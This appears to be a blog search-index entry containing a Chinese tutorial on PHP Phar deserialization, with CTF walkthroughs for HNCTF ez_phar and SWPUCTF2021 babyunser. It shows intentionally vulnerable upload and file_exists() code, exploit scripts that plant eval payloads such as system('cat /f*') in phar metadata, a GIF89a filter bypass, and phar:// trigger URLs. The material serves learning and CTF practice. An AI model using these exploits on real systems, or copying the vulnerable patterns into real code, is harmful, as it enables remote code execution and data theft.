<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Phar反序列化学习</title>
    <link href="/2023/11/14/Phar/"/>
    <url>/2023/11/14/Phar/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>我们一般利用反序列漏洞，一般都是借助unserialize()函数，不过随着人们安全的意识的提高这种漏洞利用越来越来难了，但是在今年8月份的Blackhat2018大会上，来自Secarma的安全研究员Sam Thomas讲述了一种攻击PHP应用的新方式，利用这种方法可以在不使用unserialize()函数的情况下触发PHP反序列化漏洞。漏洞触发是利用Phar:&#x2F;&#x2F; 伪协议读取phar文件时，会反序列化meta-data储存的信息。</p></blockquote><h1 id="Phar简介"><a href="#Phar简介" class="headerlink" title="Phar简介"></a>Phar简介</h1><blockquote><p>PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件，在PHP 5.3 或更高版本中默认开启，这个特性使得 PHP也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行。</p></blockquote><h1 id="PHAR文件结构"><a href="#PHAR文件结构" class="headerlink" title="PHAR文件结构"></a>PHAR文件结构</h1><blockquote><p>Phar文件主要包含三至四个部分：</p><ol><li>a stub</li></ol><p>stub的基本结构： <strong><code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>，</strong> 前面内容不限，但必须以 <code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p><ol start="2"><li>a manifest describing the contents</li></ol><p>Phar文件中被压缩的文件的一些信息，其中Meta-data部分的信息会以序列化的形式储存，这里就是漏洞利用的关键点</p><p><img src="/img/8eee74a7801a4cc891e74cd826a26809-1699950458590-47.png"></p><ol start="3"><li>the file contents</li></ol><p>被压缩的文件内容，在没有特殊要求的情况下，这个被压缩的文件内容可以随便写的，因为我们利用这个漏洞主要是为了触发它的反序列化</p><ol start="4"><li>a signature for verifying Phar integrity</li></ol><p>签名格式</p><p><img src="/img/ea030969748c48aab9808f49ffdfd614-1699950458590-48.png"></p><p>来个小例子</p><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作</p><p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</strong></p><p><img src="/img/1b407740975c463b8eed32b7ca5b3e96-1699950458590-49.png"></p></blockquote><p><strong>phar.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$o</span> -&gt; data=<span class="hljs-string">&#x27;hu3sky&#x27;</span>;<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>访问后,会生成一个phar.phar在当前目录下。</p><p><img src="/img/534014eb84c4424c80400be2a495b818-1699950458590-50.png"></p><p>用winhex打开</p><p><img src="/img/8acd3d39df2449b9bca3b26ff51ece15-1699950458590-51.png"></p><p> 可以明显的看到meta-data是以序列化的形式存储的。</p><p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过 <code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="/img/5561df16e7aa40e390bd68eeda8f3614-1699950458590-52.png"></p><h1 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1><blockquote><h1 id="upload-file-php，后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif"><a href="#upload-file-php，后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif" class="headerlink" title="upload_file.php，后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif"></a>upload_file.php，后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif</h1><p>upload_file.html 文件上传表单</p><p>file_un.php 存在file_exists()，并且存在__destruct()</p><p><strong>利用条件</strong></p><p>phar文件要能够上传到服务器端。</p><p>如file_exists()，fopen()，file_get_contents()，file()等文件操作的函数</p><p>要有可用的魔术方法作为“跳板”。</p><p>文件操作函数的参数可控，且:、&#x2F;、phar等特殊字符没有被过滤。</p><p><strong>文件内容</strong></p><p>upload_file.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>]==<span class="hljs-string">&quot;image/gif&quot;</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>], <span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>], <span class="hljs-string">&#x27;.&#x27;</span>)+<span class="hljs-number">1</span>))== <span class="hljs-string">&#x27;gif&#x27;</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Upload: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Type: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;type&quot;</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Temp file: &quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>];<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;upload_file/&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]))<br>      &#123;<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>] . <span class="hljs-string">&quot; already exists. &quot;</span>;<br>      &#125;<br>    <span class="hljs-keyword">else</span><br>      &#123;<br>      <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<br>      <span class="hljs-string">&quot;upload_file/&quot;</span> .<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>      <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Stored in: &quot;</span> . <span class="hljs-string">&quot;upload_file/&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<br>      &#125;<br>    &#125;<br><span class="hljs-keyword">else</span><br>  &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Invalid file,you can only upload gif&quot;</span>;<br>  &#125;<br><span class="hljs-meta">?&gt;</span><br>&lt;body&gt;<br>&lt;form action=<span class="hljs-string">&quot;http://localhost/phar/upload_file.php&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;file&quot;</span> name=<span class="hljs-string">&quot;file&quot;</span> /&gt;<br>    &lt;input type=<span class="hljs-string">&quot;submit&quot;</span> name=<span class="hljs-string">&quot;Upload&quot;</span> /&gt;<br>&lt;/form&gt;<br>&lt;/body&gt;<br></code></pre></td></tr></table></figure><p>file_un.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$filename</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnyClass</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span> = <span class="hljs-string">&#x27;echo &quot;ok&quot;;&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span> -&gt; output);<br>    &#125;<br>&#125;<br><span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>);<br></code></pre></td></tr></table></figure><p><strong>实现过程</strong></p><p>首先是根据file_un.php写一个生成phar的php文件，当然需要绕过gif，所以需要加GIF89a，然后我们访问这个php文件后，生成了phar.phar，修改后缀为gif，上传到服务器，然后利用file_exists，使用 <code>phar://</code>执行代码</p></blockquote><p><strong>构造代码</strong></p><blockquote><p>exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AnyClass</span></span>&#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$output</span> = <span class="hljs-string">&#x27;echo &quot;ok&quot;;&#x27;</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span> -&gt; output);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;GIF89a&#x27;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnyClass</span>();<br><span class="hljs-variable">$object</span> -&gt; output= <span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br><span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$object</span>);<br><span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><p>访问exp.php，会在当前目录生成phar.phar，然后修改后缀 gif</p><p><img src="/img/f7414e3de2a840a3b2ebf4f814c18087-1699950458590-53.png"></p><p>然后进行上传</p><p><img src="/img/e96457da15204c649b484a40c54e6566-1699950458590-54.png"></p><p><img src="/img/2a98653fefba4cb1bd965017b880bccc-1699950458591-55.png"></p><p>然后利用file_un.php。</p><p>payload:file_un.php?filename&#x3D;phar:&#x2F;&#x2F;upload_file&#x2F;phar.gif</p></blockquote><p><img src="/img/7c1ac027c51f43cc8b59d63eebc6e600-1699950458591-56.png"></p><p>摘自：<a href="https://www.cnblogs.com/zzjdbk/p/13030571.html" title="https://www.cnblogs.com/zzjdbk/p/13030571.html">https://www.cnblogs.com/zzjdbk/p/13030571.html</a></p><p>一道简单的phar反序列化题目，拿来练练手</p><h1 id="HNCTF-2022-WEEK3-ez-phar"><a href="#HNCTF-2022-WEEK3-ez-phar" class="headerlink" title="[HNCTF 2022 WEEK3]ez_phar"></a>[HNCTF 2022 WEEK3]ez_phar</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Implement __destruct() method.</span><br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br>    &#125;<br>&#125;<br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br><span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>访问&#x2F;upload.php</p><p><img src="/img/08bb653d7c1a4300a4ac8e63f9199bb8-1699950458591-57.png"></p><p>生成phar文件</p><p>exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$code</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Implement __destruct() method.</span><br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;code);<br>    &#125;<br>&#125; <br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);<br><span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$object</span> -&gt; code= <span class="hljs-string">&#x27;system(&quot;cat /f*&quot;);&#x27;</span>;<br><span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$object</span>);<br><span class="hljs-variable">$phar</span> -&gt; <span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><p> 改后缀</p><p><img src="/img/c3d191a5048a4315b2fbf2e2cb401944-1699950458591-58.png"></p><p>上传</p><p><img src="/img/c750af61ac654ec1b73f1ebcf3fa86bd-1699950458591-59.png"></p><p>使用phar伪协议访问时进行反序列化</p><blockquote><p>?filename&#x3D;phar:&#x2F;&#x2F;upload&#x2F;phar.jpeg</p></blockquote><p><img src="/img/e016e91491c9435cb2b9eb12d29d1b86-1699950458591-60.png"></p><h1 id="SWPUCTF2021-babyunser"><a href="#SWPUCTF2021-babyunser" class="headerlink" title="SWPUCTF2021_babyunser"></a>SWPUCTF2021_babyunser</h1><p>打开题目</p><p>先查看文件</p><p><img src="/img/829ad7c18df3460c9eabd8e4c30bef48-1699950458591-61.png"></p><blockquote><p>查看read.php</p><p><img src="/img/754a99e2c3f045aa98434e11f9b383d6-1699950458591-62.png"></p><p>read.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;!DOCTYPE html&gt;<br>&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;<br>&lt;head&gt;<br>    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;<br>    &lt;meta name=<span class="hljs-string">&quot;viewport&quot;</span> content=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;<br>    &lt;meta http-equiv=<span class="hljs-string">&quot;X-UA-Compatible&quot;</span> content=<span class="hljs-string">&quot;ie=edge&quot;</span>&gt;<br>    &lt;title&gt;aa的文件查看器&lt;/title&gt;<br>    &lt;style&gt;<br>        .search_form&#123;<br>            width:<span class="hljs-number">602</span>px;<br>            height:<span class="hljs-number">42</span>px;<br>        &#125;<br><br>        <span class="hljs-comment">/*左边输入框设置样式*/</span><br>        .input_text&#123;<br>            width:<span class="hljs-number">400</span>px;<br>            height: <span class="hljs-number">40</span>px;<br>            border:<span class="hljs-number">1</span>px solid green;<br>            <span class="hljs-comment">/*清除掉默认的padding*/</span><br>            padding:<span class="hljs-number">0</span>px;<br>            <span class="hljs-comment">/*提示字首行缩进*/</span><br>            text-indent: <span class="hljs-number">10</span>px;<br><br>            <span class="hljs-comment">/*去掉蓝色高亮框*/</span><br>            outline: none;<br><br>            <span class="hljs-comment">/*用浮动解决内联元素错位及小间距的问题*/</span><br>            <span class="hljs-keyword">float</span>:left;<br>        &#125;<br><br>        .input_sub&#123;<br>            width:<span class="hljs-number">100</span>px;<br>            height: <span class="hljs-number">42</span>px;<br>            background: green;<br>            text-align:center;<br>            <span class="hljs-comment">/*去掉submit按钮默认边框*/</span><br>            border:<span class="hljs-number">0</span>px;<br>            <span class="hljs-comment">/*改成右浮动也是可以的*/</span><br>            <span class="hljs-keyword">float</span>:left;<br>            color:white;<span class="hljs-comment">/*搜索的字体颜色为白色*/</span><br>            cursor:pointer;<span class="hljs-comment">/*鼠标变为小手*/</span><br>        &#125;<br><br>        .file_content&#123;<br>            width:<span class="hljs-number">500</span>px;<br>            height: <span class="hljs-number">242</span>px;<br>        &#125;<br>    &lt;/style&gt;<br>&lt;/head&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">aa</span>();<br><span class="hljs-meta">?&gt;</span><br>&lt;body&gt;<br>&lt;h1&gt;aa的文件查看器&lt;/h1&gt;<br>&lt;form <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">search_form</span>&quot; <span class="hljs-title">action</span>=&quot;&quot; <span class="hljs-title">method</span>=&quot;<span class="hljs-title">post</span>&quot;&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">text</span>&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">input_text</span>&quot; <span class="hljs-title">placeholder</span>=&quot;请输入搜索内容&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">file</span>&quot;&gt;</span><br><span class="hljs-class">    &lt;<span class="hljs-title">input</span> <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot; <span class="hljs-title">value</span>=&quot;查看&quot; <span class="hljs-title">class</span>=&quot;<span class="hljs-title">input_sub</span>&quot;&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">body</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">html</span>&gt;</span><br><span class="hljs-class">&lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class"><span class="hljs-title">error_reporting</span>(0);</span><br><span class="hljs-class">$<span class="hljs-title">filename</span>=$<span class="hljs-title">_POST</span>[&#x27;<span class="hljs-title">file</span>&#x27;];</span><br><span class="hljs-class"><span class="hljs-title">if</span>(!<span class="hljs-title">isset</span>($<span class="hljs-title">filename</span>))</span>&#123;<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-variable">$file</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">zz</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-variable">$file</span>-&gt;<span class="hljs-title function_ invoke__">getFile</span>();<br><span class="hljs-meta">?&gt;</span><br>&lt;br&gt;<br>&lt;textarea <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">file_content</span>&quot; <span class="hljs-title">type</span>=&quot;<span class="hljs-title">text</span>&quot; <span class="hljs-title">value</span>=&lt;?<span class="hljs-title">php</span> <span class="hljs-title">echo</span> &quot;&lt;<span class="hljs-title">br</span>&gt;&quot;.$<span class="hljs-title">contents</span>;?&gt;</span><br></code></pre></td></tr></table></figure><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;html&gt;<br>&lt;title&gt;aa的文件上传器&lt;/title&gt;<br>&lt;body&gt;<br>    &lt;form action=<span class="hljs-string">&quot;&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span> method=<span class="hljs-string">&quot;post&quot;</span>&gt;<br>        &lt;p&gt;请选择要上传的文件：&lt;p&gt;<br>            &lt;input <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">input_file</span>&quot; <span class="hljs-title">type</span>=&quot;<span class="hljs-title">file</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">upload_file</span>&quot;/&gt;</span><br><span class="hljs-class">            &lt;<span class="hljs-title">input</span> <span class="hljs-title">class</span>=&quot;<span class="hljs-title">button</span>&quot; <span class="hljs-title">type</span>=&quot;<span class="hljs-title">submit</span>&quot; <span class="hljs-title">name</span>=&quot;<span class="hljs-title">submit</span>&quot; <span class="hljs-title">value</span>=&quot;上传&quot;/&gt;</span><br><span class="hljs-class">    &lt;/<span class="hljs-title">form</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">body</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">html</span>&gt;</span><br><span class="hljs-class"></span><br><span class="hljs-class">&lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class">    <span class="hljs-title">if</span>(<span class="hljs-title">isset</span>($<span class="hljs-title">_POST</span>[&#x27;<span class="hljs-title">submit</span>&#x27;]))</span>&#123;<br>        <span class="hljs-variable">$upload_path</span>=<span class="hljs-string">&quot;upload/&quot;</span>.<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">time</span>()).<span class="hljs-string">&quot;.txt&quot;</span>;<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_path</span>)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;文件路径：&quot;</span>.<span class="hljs-variable">$upload_path</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传失败&#x27;</span>;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><p>上传后会将文件重命名为txt格式，因此直接传马行不通</p><p>可以上传phar文件，phar反序列化看的是内容而不是文件的格式，我们可以通过phar伪协议读取文件进行反序列化执行命令</p><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 